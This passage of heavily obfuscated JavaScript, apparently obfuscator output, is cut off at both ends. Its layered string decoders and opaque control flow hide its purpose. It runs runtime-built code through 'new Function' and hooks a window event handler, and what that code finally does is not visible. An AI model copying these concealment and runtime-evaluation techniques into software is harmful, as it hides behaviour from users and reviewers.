Imh86ks[QzG8ub<-0x30?QzG8ub-0x4e:QzG8ub>-0x30?QzG8ub>-0x30?QzG8ub+0x2f:QzG8ub+0x14:QzG8ub-0x4e]},0x1);uGAa39(QzG8ub[VUT2s4(0x5a)]=VUT2s4(0x71),QzG8ub[VUT2s4(0x9f)]=QzG8ub[0x1]);if(typeof QzG8ub[VUT2s4(0x66)]===aUFcZqZ(VUT2s4(0x72))){QzG8ub[VUT2s4(0x66)]=rMTii5V}if(typeof QzG8ub[0x4]===aUFcZqZ(0xd0)){QzG8ub[0x4]=Z4ij83f}if(QzG8ub[VUT2s4(0x5c)]&&QzG8ub[0x3]!==rMTii5V){zPV4te=rMTii5V;return zPV4te(QzG8ub[VUT2s4(0x70)],-VUT2s4(0x6c),QzG8ub[0x2],QzG8ub[VUT2s4(0x66)],QzG8ub[VUT2s4(0x67)])}if(QzG8ub[VUT2s4(0x66)]===zPV4te){rMTii5V=QzG8ub[VUT2s4(0x9f)];return rMTii5V(QzG8ub[VUT2s4(0x5c)])}if(QzG8ub[ry8N2BZ(0x16)]){[QzG8ub[0x4],QzG8ub.iyytnn]=[QzG8ub[0x3](QzG8ub[ry8N2BZ(-0x22)]),QzG8ub[0x0]||QzG8ub[0x2]];return zPV4te(QzG8ub[VUT2s4(0x70)],QzG8ub[ry8N2BZ(-0x22)],QzG8ub[VUT2s4(0x5c)])}if(QzG8ub[0x2]==QzG8ub[VUT2s4(0x66)]){return QzG8ub[ry8N2BZ(0x16)]?QzG8ub[0x0][QzG8ub[ry8N2BZ(-0x22)][QzG8ub[ry8N2BZ(0x16)]]]:Z4ij83f[QzG8ub[0x0]]||(QzG8ub[ry8N2BZ(-0x2d)]=QzG8ub[ry8N2BZ(-0x22)][QzG8ub[0x0]]||QzG8ub[ry8N2BZ(-0x23)],Z4ij83f[QzG8ub[VUT2s4(0x70)]]=QzG8ub[0x2](T48M7Du[QzG8ub[0x0]]))}if(QzG8ub[0x2]==QzG8ub[VUT2s4(0x70)]){return QzG8ub[ry8N2BZ(0x16)][Z4ij83f[QzG8ub[VUT2s4(0x5c)]]]=zPV4te(QzG8ub[0x0],QzG8ub[VUT2s4(0x9f)])}if(QzG8ub[ry8N2BZ(-0x19)]!==QzG8ub[VUT2s4(0x9f)]){return QzG8ub[0x4][QzG8ub[0x0]]||(QzG8ub[VUT2s4(0x67)][QzG8ub[VUT2s4(0x70)]]=QzG8ub[VUT2s4(0x66)](T48M7Du[QzG8ub[ry8N2BZ(-0x19)]]))}},QzG8ub(0x55));function ry8N2BZ(){return globalThis}function Tl85W6m(){return global}function rLqAuyh(){return window}function VqSuJl(...zPV4te){var ry8N2BZ;function Tl85W6m(zPV4te){return Imh86ks[zPV4te>0x8?zPV4te>0x15b?zPV4te+0x10:zPV4te>0x15b?zPV4te-0x36:zPV4te>0x15b?zPV4te+0x59:zPV4te-0x9:zPV4te+0x1]}uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x70),zPV4te[VUT2s4(0xa4)]=-0x26,ry8N2BZ=WfgY8I((...zPV4te)=>{var Tl85W6m=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x19?zPV4te+0x3f:zPV4te>0x16c?zPV4te+0x28:zPV4te<0x16c?zPV4te>0x16c?zPV4te-0x1e:zPV4te-0x1a:zPV4te+0xa]},0x1);uGAa39(zPV4te.length=0x5,zPV4te[VUT2s4(0x6b)]=zPV4te[VUT2s4(0x6c)]);if(typeof zPV4te[QzG8ub(0x4a)]===aUFcZqZ(QzG8ub(0x56))){zPV4te[VUT2s4(0x66)]=rLqAuyh}if(typeof zPV4te[VUT2s4(0x67)]===aUFcZqZ(0xd0)){zPV4te[VUT2s4(0x67)]=Z4ij83f}zPV4te[Tl85W6m(0x60)]=-0x5c;if(zPV4te[QzG8ub(0x54)]!==zPV4te[VUT2s4(0x6b)]){var VqSuJl=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x5e?zPV4te<0x5e?zPV4te-0x40:zPV4te-0x5f:zPV4te+0x4f]},0x1);return zPV4te[VqSuJl(0x6c)][zPV4te[Tl85W6m(0x30)]]||(zPV4te[0x4][zPV4te[Tl85W6m(0x30)]]=zPV4te[QzG8ub(0x4a)](T48M7Du[zPV4te[0x0]]))}if(zPV4te[zPV4te[QzG8ub(0x84)]+Tl85W6m(0x61)]==zPV4te[VUT2s4(0x66)]){var fnXXAUr=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x173?zPV4te-0x3c:zPV4te>0x173?zPV4te+0x19:zPV4te>0x20?zPV4te>0x173?zPV4te-0x0:zPV4te-0x21:zPV4te+0x23]},0x1);return zPV4te[zPV4te[Tl85W6m(0x60)]+0x9f]?zPV4te[zPV4te[Tl85W6m(0x60)]+(zPV4te[Tl85W6m(0x60)]+fnXXAUr(0x69))][zPV4te[zPV4te[fnXXAUr(0x67)]+VUT2s4(0xa3)][zPV4te[VUT2s4(0x6b)]]]:Z4ij83f[zPV4te[0x0]]||(zPV4te[0x2]=zPV4te[VUT2s4(0x67)][zPV4te[zPV4te[QzG8ub(0x84)]+(zPV4te[fnXXAUr(0x67)]+VUT2s4(0xa2))]]||zPV4te[VUT2s4(0x66)],Z4ij83f[zPV4te[fnXXAUr(0x37)]]=zPV4te[fnXXAUr(0x23)](T48M7Du[zPV4te[VUT2s4(0x70)]]))}if(zPV4te[0x3]===ry8N2BZ){rLqAuyh=zPV4te[Tl85W6m(0x2b)];return rLqAuyh(zPV4te[zPV4te[Tl85W6m(0x60)]+0x5e])}},VUT2s4(0x71)),zPV4te[Tl85W6m(0x53)]=0x8f,zPV4te[Tl85W6m(0x54)]={[aUFcZqZ(VUT2s4(0xa6))]:ry8N2BZ(QzG8ub(0x4a))},zPV4te.BwWHZO=QzG8ub(0xc1));return zPV4te[VUT2s4(0xa4)]>zPV4te[Tl85W6m(0x53)]+0x7c?zPV4te[Tl85W6m(0x78)]:new Function(zPV4te[Tl85W6m(0x54)][aUFcZqZ(VUT2s4(0xa6))])();function rLqAuyh(...zPV4te){var ry8N2BZ;uGAa39(zPV4te[VUT2s4(0x5a)]=Tl85W6m(0x1b),zPV4te[Tl85W6m(0xf)]=-0x3,zPV4te[zPV4te[0x1c]+VUT2s4(0x67)]='\x32\x77\x29\x40\x78\x2e\x5f\x26\x2a\x2b\x45\x49\x57\x64\x4c\x56\x4a\x5a\x43\x66\x3c\x59\x22\x74\x42\x24\x62\x58\x54\x4d\x50\x7a\x39\x30\x76\x5e\x2f\x6b\x6a\x3d\x4e\x7e\x53\x31\x47\x73\x33\x79\x36\x23\x69\x6c\x44\x3f\x71\x34\x41\x46\x67\x65\x3b\x3e\x6e\x37\x72\x6f\x4b\x5d\x3a\x7b\x4f\x51\x6d\x75\x21\x48\x7d\x70\x63\x35\x68\x52\x55\x61\x7c\x38\x5b\x25\x60\x2c\x28',zPV4te[0x2]=''+(zPV4te[zPV4te[zPV4te[QzG8ub(0x44)]+Tl85W6m(0x89)]-(zPV4te[Tl85W6m(0xf)]-QzG8ub(0x54))]||''),zPV4te[Tl85W6m(0x15)]=zPV4te[VUT2s4(0x5c)].length,zPV4te.r2av1Yr=[],zPV4te[QzG8ub(0x8d)]=0x0,zPV4te[0x6]=0x0,zPV4te[0x7]=-QzG8ub(0x50));for(ry8N2BZ=Tl85W6m(0x1f);ry8N2BZ<zPV4te[QzG8ub(0x4a)];ry8N2BZ++){zPV4te[0x9]=zPV4te[Tl85W6m(0x1b)].indexOf(zPV4te[Tl85W6m(0xb)][ry8N2BZ]);if(zPV4te[QzG8ub(0x78)]===-VUT2s4(0x6c)){continue}if(zPV4te[Tl85W6m(0x2b)]<0x0){zPV4te[QzG8ub(0x60)]=zPV4te[Tl85W6m(0x43)]}else{var rLqAuyh=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x10e?zPV4te<0x10e?zPV4te>0x10e?zPV4te-0x19:zPV4te+0x44:zPV4te+0x16:zPV4te-0x5b]},0x1);uGAa39(zPV4te[VUT2s4(0x7c)]+=zPV4te[0x9]*rLqAuyh(-0x7),zPV4te.cuYQ7c|=zPV4te[0x7]<<zPV4te[QzG8ub(0x5d)],zPV4te[Tl85W6m(0x28)]+=(zPV4te[zPV4te[QzG8ub(0x44)]+Tl85W6m(0x67)]&0x1fff)>Tl85W6m(0x48)?0xd:zPV4te[rLqAuyh(-0x3e)]+rLqAuyh(0xa));do{uGAa39(zPV4te[VUT2s4(0xab)].push(zPV4te[rLqAuyh(0xb)]&0xff),zPV4te[QzG8ub(0x8d)]>>=zPV4te[0x1c]+Tl85W6m(0x59),zPV4te[VUT2s4(0x79)]-=0x8)}while(zPV4te[0x6]>Tl85W6m(0x2b));zPV4te[Tl85W6m(0x2b)]=-QzG8ub(0x50)}}if(zPV4te[0x7]>-Tl85W6m(0x1b)){zPV4te.r2av1Yr.push((zPV4te[Tl85W6m(0x58)]|zPV4te[0x7]<<zPV4te[Tl85W6m(0x28)])&Tl85W6m(0x4c))}return zPV4te[QzG8ub(0x44)]>0x65?zPV4te[VUT2s4(0xe8)]:xdOTMdG(zPV4te[Tl85W6m(0x5a)])}}function fnXXAUr(zPV4te=[ry8N2BZ,Tl85W6m,rLqAuyh,VqSuJl],fnXXAUr,rMTii5V,GEhvy_Q,UqgF_f=[],KfMZwa,GSGOh7,cyCERmv=0x0,dgXAjo,_SYVIe){uGAa39(fnXXAUr=WfgY8I((...zPV4te)=>{var rMTii5V=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x21?zPV4te+0x5c:zPV4te<0x21?zPV4te-0x25:zPV4te>0x174?zPV4te-0xa:zPV4te<0x21?zPV4te+0xa:zPV4te-0x22]},0x1);uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x71),zPV4te[QzG8ub(0x90)]=zPV4te[QzG8ub(0x4b)]);if(typeof zPV4te[0x3]===aUFcZqZ(VUT2s4(0x72))){zPV4te[QzG8ub(0x4a)]=mvlFoT}if(typeof zPV4te[QzG8ub(0x90)]===aUFcZqZ(QzG8ub(0x56))){zPV4te[QzG8ub(0x90)]=Z4ij83f}if(zPV4te[VUT2s4(0x5c)]==zPV4te[VUT2s4(0x70)]){return zPV4te[0x1][Z4ij83f[zPV4te[VUT2s4(0x5c)]]]=fnXXAUr(zPV4te[0x0],zPV4te[0x1])}if(zPV4te[0x0]!==zPV4te[0x1]){var GEhvy_Q=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x14d?zPV4te-0x4c:zPV4te<-0x6?zPV4te-0x5:zPV4te<-0x6?zPV4te+0x1e:zPV4te>-0x6?zPV4te+0x5:zPV4te-0x54]},0x1);return zPV4te[GEhvy_Q(0x4d)][zPV4te[VUT2s4(0x70)]]||(zPV4te._d47QK[zPV4te[0x0]]=zPV4te[0x3](T48M7Du[zPV4te[QzG8ub(0x54)]]))}if(zPV4te[rMTii5V(0x34)]){[zPV4te._d47QK,zPV4te[QzG8ub(0x50)]]=[zPV4te[0x3](zPV4te[VUT2s4(0xac)]),zPV4te[QzG8ub(0x54)]||zPV4te[VUT2s4(0x5c)]];return fnXXAUr(zPV4te[rMTii5V(0x38)],zPV4te[QzG8ub(0x90)],zPV4te[rMTii5V(0x24)])}if(zPV4te[QzG8ub(0x4a)]===VUT2s4(0x87)){fnXXAUr=zPV4te[VUT2s4(0xac)]}if(zPV4te[VUT2s4(0x5c)]==zPV4te[VUT2s4(0x66)]){return zPV4te[QzG8ub(0x50)]?zPV4te[QzG8ub(0x54)][zPV4te[rMTii5V(0x74)][zPV4te[VUT2s4(0x6c)]]]:Z4ij83f[zPV4te[rMTii5V(0x38)]]||(zPV4te[rMTii5V(0x24)]=zPV4te[VUT2s4(0xac)][zPV4te[VUT2s4(0x70)]]||zPV4te[VUT2s4(0x66)],Z4ij83f[zPV4te[0x0]]=zPV4te[rMTii5V(0x24)](T48M7Du[zPV4te[rMTii5V(0x38)]]))}},VUT2s4(0x71)),rMTii5V=[fnXXAUr(QzG8ub(0x8e))],GEhvy_Q=GEhvy_Q);try{uGAa39(KfMZwa=WfgY8I((...zPV4te)=>{uGAa39(zPV4te[VUT2s4(0x5a)]=QzG8ub(0x55),zPV4te[0xf]=zPV4te[VUT2s4(0x5c)]);if(typeof zPV4te[QzG8ub(0x4a)]===aUFcZqZ(VUT2s4(0x72))){zPV4te[VUT2s4(0x66)]=eQQMUN}if(typeof zPV4te[0x4]===aUFcZqZ(0xd0)){zPV4te[QzG8ub(0x4b)]=Z4ij83f}zPV4te[VUT2s4(0x91)]=-VUT2s4(0xad);if(zPV4te[VUT2s4(0x70)]!==zPV4te[VUT2s4(0x6c)]){var fnXXAUr=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x1b0?zPV4te-0x16:zPV4te<0x5d?zPV4te-0xc:zPV4te<0x1b0?zPV4te<0x5d?zPV4te-0x30:zPV4te-0x5e:zPV4te+0x13]},0x1);return zPV4te[QzG8ub(0x4b)][zPV4te[QzG8ub(0x54)]]||(zPV4te[zPV4te[fnXXAUr(0x95)]+VUT2s4(0x85)][zPV4te[QzG8ub(0x54)]]=zPV4te[fnXXAUr(0x6a)](T48M7Du[zPV4te[0x0]]))}if(zPV4te[VUT2s4(0x77)]==zPV4te[0x3]){var rMTii5V=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x1b3?zPV4te>0x1b3?zPV4te+0x62:zPV4te-0x61:zPV4te-0x5f]},0x1);return zPV4te[zPV4te[rMTii5V(0x98)]+QzG8ub(0x58)]?zPV4te[VUT2s4(0x70)][zPV4te[zPV4te[VUT2s4(0x91)]+0x40][zPV4te[QzG8ub(0x50)]]]:Z4ij83f[zPV4te[rMTii5V(0x77)]]||(zPV4te[zPV4te[QzG8ub(0x75)]+rMTii5V(0xb5)]=zPV4te[zPV4te[0x86]+VUT2s4(0x85)][zPV4te[QzG8ub(0x54)]]||zPV4te[rMTii5V(0x6d)],Z4ij83f[zPV4te[zPV4te[rMTii5V(0x98)]+0x3c]]=zPV4te[rMTii5V(0x7e)](T48M7Du[zPV4te[VUT2s4(0x70)]]))}if(zPV4te[VUT2s4(0x66)]===KfMZwa){var GEhvy_Q=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x147?zPV4te-0x51:zPV4te>-0xc?zPV4te<-0xc?zPV4te-0x19:zPV4te<0x147?zPV4te+0xb:zPV4te+0x42:zPV4te-0x37]},0x1);eQQMUN=zPV4te[0x1];return eQQMUN(zPV4te[GEhvy_Q(0x12)])}if(zPV4te[0xf]&&zPV4te[zPV4te[0x86]+0x3f]!==eQQMUN){KfMZwa=eQQMUN;return KfMZwa(zPV4te[0x0],-0x1,zPV4te[0xf],zPV4te[QzG8ub(0x4a)],zPV4te[VUT2s4(0x67)])}},VUT2s4(0x71)),GSGOh7=KfMZwa(0x5),GEhvy_Q=Object,UqgF_f[KfMZwa(VUT2s4(0x67))](''[GSGOh7+KfMZwa(VUT2s4(0x79))][KfMZwa(QzG8ub(0x60))+KfMZwa(0x8)][KfMZwa[aUFcZqZ(QzG8ub(0xfb))](VUT2s4(0x87),0x9)]),WfgY8I(eQQMUN,VUT2s4(0x6c)));function eQQMUN(...zPV4te){var fnXXAUr;uGAa39(zPV4te[QzG8ub(0x3e)]=VUT2s4(0x6c),zPV4te[VUT2s4(0x74)]=VUT2s4(0x71),zPV4te[QzG8ub(0x96)]='\u003a\u005a\u0041\u0049\u006f\u0069\u0055\u0070\u004b\u0072\u006a\u006e\u006b\u0039\u006c\u0035\u0051\u0076\u005f\u0025\u0048\u0032\u003b\u0037\u0068\u005d\u0034\u0067\u002e\u0052\u002c\u0065\u0038\u004d\u0031\u0024\u002f\u0040\u0063\u0064\u006d\u0030\u0022\u007c\u0061\u0050\u0079\u002b\u0054\u007d\u0071\u0028\u0036\u0075\u0033\u004a\u004c\u0074\u0021\u0047\u0058\u003c\u0077\u0042\u0026\u0023\u005b\u0066\u003d\u0053\u0060\u0057\u0059\u002a\u007e\u007b\u0073\u0078\u0045\u0062\u003f\u007a\u0043\u0046\u0029\u005e\u0056\u0044\u004f\u004e\u003e',zPV4te[zPV4te[QzG8ub(0x58)]-0x3]=''+(zPV4te[QzG8ub(0x54)]||''),zPV4te[0x3d]=zPV4te[QzG8ub(0x58)]-QzG8ub(0x93),zPV4te[zPV4te[QzG8ub(0x58)]+QzG8ub(0x94)]=zPV4te[zPV4te[0x3d]-(zPV4te[VUT2s4(0x74)]-VUT2s4(0x5c))].length,zPV4te[0x4]=[],zPV4te[QzG8ub(0x95)]=zPV4te[QzG8ub(0x54)],zPV4te[0x5]=0x0,zPV4te[zPV4te[VUT2s4(0x74)]+0x30]=VUT2s4(0x70),zPV4te[zPV4te[QzG8ub(0x58)]+0x31]=-QzG8ub(0x50));for(fnXXAUr=0x0;fnXXAUr<zPV4te[zPV4te[VUT2s4(0x74)]+0x2d];fnXXAUr++){var rMTii5V=kb03HM(zPV4te=>{return Imh86ks[zPV4te>-0x7?zPV4te>-0x7?zPV4te>0x14c?zPV4te-0x3:zPV4te+0x6:zPV4te-0x17:zPV4te+0x38]},0x1);zPV4te[VUT2s4(0xb4)]=zPV4te[QzG8ub(0x96)].indexOf(zPV4te[zPV4te[rMTii5V(0x14)]+rMTii5V(0x53)][fnXXAUr]);if(zPV4te[QzG8ub(0x98)]===-0x1){continue}if(zPV4te[zPV4te[rMTii5V(0x14)]-(zPV4te[0x3d]-VUT2s4(0x7c))]<0x0){zPV4te[QzG8ub(0x60)]=zPV4te[VUT2s4(0xb4)]}else{var GEhvy_Q=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x1a7?zPV4te+0x59:zPV4te<0x54?zPV4te-0x52:zPV4te<0x1a7?zPV4te<0x54?zPV4te-0x38:zPV4te-0x55:zPV4te+0x16]},0x1);uGAa39(zPV4te[zPV4te[QzG8ub(0x58)]+rMTii5V(0x36)]+=zPV4te[rMTii5V(0x54)]*GEhvy_Q(0x92),zPV4te[VUT2s4(0x71)]|=zPV4te[GEhvy_Q(0x77)]<<zPV4te[0x6],zPV4te[0x6]+=(zPV4te[rMTii5V(0x1c)]&0x1fff)>GEhvy_Q(0x94)?rMTii5V(0x3a):0xe);do{uGAa39(zPV4te[VUT2s4(0x67)].push(zPV4te[QzG8ub(0x55)]&zPV4te[zPV4te[GEhvy_Q(0x6f)]+rMTii5V(0x55)]+0x129),zPV4te[zPV4te[VUT2s4(0x74)]-(zPV4te[0x3d]-VUT2s4(0x71))]>>=0x8,zPV4te[zPV4te[VUT2s4(0x74)]+0x30]-=0x8)}while(zPV4te[rMTii5V(0x19)]>QzG8ub(0x60));zPV4te[zPV4te[QzG8ub(0x58)]+rMTii5V(0x36)]=-0x1}}if(zPV4te[VUT2s4(0x7c)]>-0x1){var UqgF_f=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x154?zPV4te<0x1?zPV4te+0x51:zPV4te<0x1?zPV4te+0x36:zPV4te<0x1?zPV4te+0x3c:zPV4te-0x2:zPV4te-0x2]},0x1);zPV4te[zPV4te[QzG8ub(0x58)]+UqgF_f(0xc2)].push((zPV4te[UqgF_f(0x19)]|zPV4te[VUT2s4(0x7c)]<<zPV4te[VUT2s4(0x79)])&VUT2s4(0x9d))}return zPV4te[VUT2s4(0x74)]>VUT2s4(0xb6)?zPV4te[QzG8ub(0x9b)]:xdOTMdG(zPV4te[VUT2s4(0x67)])}}catch(e){}vHNIUY:for(cyCERmv=cyCERmv;cyCERmv<zPV4te[fnXXAUr(VUT2s4(0xb8))]&&ekkU6Y.UIoNQw[rMTii5V[VUT2s4(0x70)]](0x6)=='\x75';cyCERmv++)try{var hZmlYq=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x10c?zPV4te<-0x47?zPV4te+0x56:zPV4te<-0x47?zPV4te-0x56:zPV4te+0x46:zPV4te-0x14]},0x1);uGAa39(dgXAjo={[aUFcZqZ(QzG8ub(0x9d))]:fnXXAUr(0xa)},GEhvy_Q=zPV4te[cyCERmv]());for(_SYVIe=QzG8ub(0x54);_SYVIe<UqgF_f[dgXAjo[aUFcZqZ(hZmlYq(0x19))]]&&ekkU6Y.qjkibX();_SYVIe++)if(typeof GEhvy_Q[UqgF_f[_SYVIe]]===fnXXAUr[aUFcZqZ(VUT2s4(0x142))](hZmlYq(-0x19),[hZmlYq(-0x28)])&&ekkU6Y.qjkibX()){continue vHNIUY}return GEhvy_Q}catch(e){}return GEhvy_Q||this;function mvlFoT(...zPV4te){var fnXXAUr;uGAa39(zPV4te.length=0x1,zPV4te[VUT2s4(0x89)]=-QzG8ub(0x9e),zPV4te.aTeA6i='\u0072\u006a\u006f\u006c\u004a\u0047\u0071\u002c\u0061\u0054\u003b\u0021\u0058\u005d\u003d\u0068\u0039\u007b\u0022\u0043\u0028\u0024\u003a\u005e\u0032\u0052\u002a\u0053\u0062\u0029\u0042\u003c\u0050\u005a\u0056\u0049\u0078\u0064\u0023\u0041\u004d\u0034\u0036\u0075\u0044\u004c\u0063\u002f\u002b\u004b\u0073\u0037\u0038\u0057\u007d\u0076\u004e\u006e\u0067\u0059\u0069\u004f\u0035\u003e\u0046\u003f\u005f\u0045\u007e\u0051\u006d\u0077\u006b\u0065\u0048\u0066\u005b\u0040\u0055\u0030\u0031\u0025\u0074\u0079\u0026\u0033\u0060\u002e\u007c\u007a\u0070',zPV4te[QzG8ub(0x40)]=''+(zPV4te[QzG8ub(0x54)]||''),zPV4te[QzG8ub(0x4a)]=zPV4te[0x2].length,zPV4te[QzG8ub(0x4b)]=[],zPV4te.BdPojbN=VUT2s4(0x70),zPV4te[VUT2s4(0x79)]=VUT2s4(0x70),zPV4te[VUT2s4(0x7c)]=-VUT2s4(0x6c));for(fnXXAUr=zPV4te[0xd4]+QzG8ub(0x9e);fnXXAUr<zPV4te[0x3];fnXXAUr++){zPV4te[QzG8ub(0x78)]=zPV4te.aTeA6i.indexOf(zPV4te[zPV4te[zPV4te[zPV4te[VUT2s4(0x89)]+VUT2s4(0xbb)]+VUT2s4(0xbb)]+VUT2s4(0x5e)][fnXXAUr]);if(zPV4te[zPV4te[zPV4te[0xd4]+VUT2s4(0xbb)]+VUT2s4(0xb3)]===-QzG8ub(0x50)){continue}if(zPV4te[zPV4te[VUT2s4(0x89)]+VUT2s4(0xbc)]<0x0){zPV4te[VUT2s4(0x7c)]=zPV4te[VUT2s4(0x94)]}else{uGAa39(zPV4te[QzG8ub(0x60)]+=zPV4te[QzG8ub(0x78)]*0x5b,zPV4te.BdPojbN|=zPV4te[QzG8ub(0x60)]<<zPV4te[VUT2s4(0x79)],zPV4te[zPV4te[zPV4te[QzG8ub(0x6d)]+QzG8ub(0x9f)]+VUT2s4(0xbd)]+=(zPV4te[QzG8ub(0x60)]&zPV4te[VUT2s4(0x89)]+0x2022)>QzG8ub(0x7d)?VUT2s4(0x9a):0xe);do{var rMTii5V=kb03HM(zPV4te=>{return Imh86ks[zPV4te>0x191?zPV4te-0x5e:zPV4te-0x3f]},0x1);uGAa39(zPV4te[zPV4te[0xd4]+0x27].push(zPV4te[QzG8ub(0xa2)]&rMTii5V(0x82)),zPV4te[VUT2s4(0xbe)]>>=rMTii5V(0x81),zPV4te[zPV4te[0xd4]+QzG8ub(0xa1)]-=zPV4te[rMTii5V(0x6e)]+rMTii5V(0x46))}while(zPV4te[0x6]>QzG8ub(0x60));zPV4te[QzG8ub(0x60)]=-0x1}}if(zPV4te[QzG8ub(0x60)]>-0x1){zPV4te[VUT2s4(0x67)].push((zPV4te.BdPojbN|zPV4te[0x7]<<zPV4te[zPV4te[QzG8ub(0x6d)]+QzG8ub(0xa1)])&QzG8ub(0x81))}return zPV4te[0xd4]>QzG8ub(0x137)?zPV4te[0xb]:xdOTMdG(zPV4te[QzG8ub(0x4b)])}}return VOcdbOc=fnXXAUr[zPV4te(VUT2s4(0x9a))](this);function rMTii5V(...zPV4te){var ry8N2BZ;function Tl85W6m(zPV4te){return Imh86ks[zPV4te<-0x54?zPV4te+0x4:zPV4te>-0x54?zPV4te+0x53:zPV4te+0x21]}uGAa39(zPV4te[QzG8ub(0x3e)]=0x1,zPV4te[QzG8ub(0xa5)]=-Tl85W6m(0x12),zPV4te[VUT2s4(0xc4)]='\u0038\u003d\u002f\u003c\u0032\u002b\u002e\u005b\u007a\u0040\u0035\u003f\u0022\u0021\u0064\u0049\u0072\u0043\u0044\u0030\u006e\u007e\u004b\u0069\u0037\u003e\u0023\u0051\u0024\u0052\u0078\u0028\u004d\u0042\u0056\u0046\u006f\u006c\u003b\u0055\u004a\u0036\u005e\u005a\u0077\u0071\u0053\u0074\u0061\u007b\u0066\u0076\u0079\u0048\u0025\u0067\u002a\u0039\u007d\u0068\u002c\u006d\u006b\u0033\u004c\u003a\u0063\u0045\u007c\u005f\u0073\u005d\u0050\u0029\u0031\u0041\u0054\u0026\u0070\u0034\u006a\u004f\u0060\u0047\u004e\u0075\u0062\u0057\u0058\u0059\u0065',zPV4te[zPV4te.XkzVgle+Tl85W6m(0x13)]=''+(zPV4te[0x0]||''),zPV4te[VUT2s4(0xc3)]=zPV4te[zPV4te[VUT2s4(0xc1)]+QzG8ub(0xa4)].length,zPV4te[zPV4te[VUT2s4(0xc1)]+QzG8ub(0xa6)]=[],zPV4te[VUT2s4(0x71)]=VUT2s4(0x70),zPV4te[VUT2s4(0xc7)]=zPV4te[Tl85W6m(0x14)]+QzG8ub(0xa3),zPV4te[QzG8ub(0xaa)]=-QzG8ub(0x50));for(ry8N2BZ=Tl85W6m(-0x3d);ry8N2BZ<zPV4te[QzG8ub(0xa7)];ry8N2BZ++){var rLqAuyh=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0x17b?zPV4te>0x28?zPV4te>0x28?zPV4te<0x28?zPV4te+0x4a:zPV4te-0x29:zPV4te-0x38:zPV4te-0x9:zPV4te+0x2f]},0x1);zPV4te[VUT2s4(0xc5)]=zPV4te[VUT2s4(0xc4)].indexOf(zPV4te[zPV4te[rLqAuyh(0x90)]+Tl85W6m(0x13)][ry8N2BZ]);if(zPV4te[QzG8ub(0xa9)]===-QzG8ub(0x50)){continue}if(zPV4te[rLqAuyh(0x95)]<0x0){zPV4te[VUT2s4(0xc6)]=zPV4te[VUT2s4(0xc5)]}else{uGAa39(zPV4te.Q4XHBGo+=zPV4te.lFssy8*0x5b,zPV4te[rLqAuyh(0x40)]|=zPV4te[VUT2s4(0xc6)]<<zPV4te[Tl85W6m(0x1a)],zPV4te[VUT2s4(0xc7)]+=(zPV4te.Q4XHBGo&QzG8ub(0xac))>QzG8ub(0x7d)?zPV4te[VUT2s4(0xc1)]+VUT2s4(0xc9):VUT2s4(0x81));do{uGAa39(zPV4te[QzG8ub(0x4b)].push(zPV4te[QzG8ub(0x55)]&0xff),zPV4te[0x5]>>=zPV4te[Tl85W6m(0x14)]+0x98,zPV4te.kxhz6v-=QzG8ub(0x80))}while(zPV4te.kxhz6v>zPV4te.XkzVgle+0x97);zPV4te.Q4XHBGo=-Tl85W6m(-0x41)}}if(zPV4te[VUT2s4(0xc6)]>-VUT2s4(0x6c)){zPV4te[VUT2s4(0x67)].push((zPV4te[zPV4te[VUT2s4(0xc1)]+QzG8ub(0xae)]|zPV4te[QzG8ub(0xaa)]<<zPV4te[Tl85W6m(0x1a)])&VUT2s4(0x9d))}return zPV4te.XkzVgle>-Tl85W6m(-0x2d)?zPV4te[zPV4te[QzG8ub(0xa5)]+0x68]:xdOTMdG(zPV4te[0x4])}}[_SYVIe]();function Jgk8VIP(...uGAa39){return uGAa39[uGAa39[Tl85W6m(0xf)]-0x1]}WfgY8I(Ry5ikG0,VUT2s4(0x5c));function Ry5ikG0(...zPV4te){uGAa39(zPV4te.length=VUT2s4(0x5c),zPV4te[0xdd]=zPV4te[0x0]);switch(eQQMUN){case!ekkU6Y.qjkibX()?null:-VUT2s4(0xcb):return zPV4te[VUT2s4(0xcc)]-zPV4te[0x1];case VUT2s4(0xb0):return-zPV4te[VUT2s4(0xcc)];case-VUT2s4(0xd1):return!zPV4te[VUT2s4(0xcc)];case!ekkU6Y.qjkibX()?VUT2s4(0x6d):VUT2s4(0xd2):return zPV4te[0xdd]/zPV4te[0x1]}}WfgY8I(YZAyM8O,VUT2s4(0x6c));function YZAyM8O(...zPV4te){uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x6c),zPV4te[VUT2s4(0xcd)]=zPV4te[VUT2s4(0x70)]);return Jgk8VIP(zPV4te[VUT2s4(0xcd)]=eQQMUN+(eQQMUN=zPV4te.plveox,VUT2s4(0x70)),zPV4te[VUT2s4(0xcd)])}uGAa39(eQQMUN=eQQMUN,hZmlYq=tQaWMp(VUT2s4(0x75))[dgXAjo[aUFcZqZ(VUT2s4(0xce))]](VUT2s4(0xcf)));let eJxbUT=Tl85W6m(VUT2s4(0xa8)),xFUlTma=cyCERmv+Tl85W6m(0x13)+GSGOh7[VUT2s4(0x70)]+Tl85W6m(0x15),JnFxyvb=Tl85W6m(VUT2s4(0xd0))+Tl85W6m(VUT2s4(0xd1));uGAa39(window[Tl85W6m(VUT2s4(0xd2))]=function(){tQaWMp(VUT2s4(0x176))(()=>{var zPV4te=Tl85W6m(VUT2s4(0xd3));if(tQaWMp(0xa4)[zPV4te](JnFxyvb)&&ekkU6Y.qjkibX()){return}const QzG8ub=WfgY8I((...zPV4te)=>{uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x6c),zPV4te[VUT2s4(0xd7)]=-VUT2s4(0xd4),zPV4te[VUT2s4(0xd8)]=[Tl85W6m(VUT2s4(0x90)),Tl85W6m(zPV4te.G3putB5+VUT2s4(0xd5)),Tl85W6m(VUT2s4(0xd6))]);return 